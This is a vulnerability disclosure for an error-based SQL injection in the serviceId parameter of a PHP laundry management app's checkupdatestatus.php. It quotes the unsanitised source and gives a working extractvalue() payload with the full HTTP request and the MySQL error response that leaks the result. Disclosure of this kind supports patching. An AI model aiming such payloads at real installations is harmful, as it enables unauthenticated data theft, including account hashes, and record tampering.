## SIMPLE_LAUNDRY_SYSTEM checkupdatestatus.php Error-Based SQL Injection Vulnerability

### I. Vulnerability Impact

The `serviceId` parameter of `checkupdatestatus.php` is concatenated into an `UPDATE` statement without any validation, and the script prints the raw MySQL error message back to the client when the statement fails. An attacker can wrap any subquery in `extractvalue()` and read its result directly from the HTTP response, which allows the database name, table names and the account hashes stored in the `member` and `staff` tables to be dumped through ordinary browser requests. The endpoint performs no authentication check and no ownership check on the record being updated, so an unauthenticated visitor can also post legitimate values and change the service status of any order.

### II. Source Code Analysis

The vulnerability resides in `checkupdatestatus.php`, lines 3 and 9-13:

```php
$serviceId = $_GET['serviceId'];
...
$q = "update laundryservice set  serviceStatus='F' where serviceId =$serviceId";
...
if(!$mysqli->query($q)){
echo "Update failed: ". $mysqli->error;
}else{
header("Location: updatestatus.php");
```

`$serviceId` is assigned straight from `$_GET` and appended to the `WHERE serviceId =` clause with no quotes around it, no `intval()`, no `mysqli_real_escape_string()` and no prepared statement. Because the comparison is numeric, the parameter does not even need a quote to escape the literal: any scalar expression is accepted in that position, which makes the injection simpler than a quoted context — `extractvalue(...)` can be supplied verbatim.

Line 13 echoes `$mysqli->error` into the response whenever the query fails, so the MySQL error text travels back to the client. Passing a function that raises an error containing the result of an expression — `extractvalue()` or `updatexml()` — therefore turns the endpoint into a direct data extraction channel, with the result readable in a single request.

The file contains no `session_start()` and no session check at all, so the statement is executed for every request that reaches the script regardless of authentication.

### III. Payload

The core injection payload is:

```
extractvalue(1,concat(char(126),md5(1937365797)))
```

The resulting SQL statement executed by the server becomes:

```sql
update laundryservice set  serviceStatus='F' where serviceId =extractvalue(1,concat(char(126),md5(1937365797)))
```

`extractvalue()` is given a deliberately malformed XPath built from `char(126)` (`~`) concatenated with the value to be extracted. MySQL evaluates the argument, then rejects the XPath and reports it inside the error message, so the evaluated value — here the MD5 of `1937365797` — appears in the response. No quote is required because `serviceId` is used unquoted in the numeric context.

```
GET /checkupdatestatus.php?serviceId=extractvalue(1,concat(char(126),md5(1937365797))) HTTP/1.1
Host: bbn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bbn/updatestatus.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=spacqjha3aq8tcnnpfgfdvce3t
Connection: keep-alive
```

The response echoes the evaluated expression inside the MySQL error message, which proves that the injected SQL was executed and that arbitrary query results can be read from the page:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 09:06:43 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Content-Length: 69

Update failed: XPATH syntax error: '~4f558a941940ebaa2104c0ef61924bf'
```

### IV. Source Download

https://code-projects.org/simple-laundry-system-in-php-with-source-code/



![image-20261030170802138](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030170802138.png)

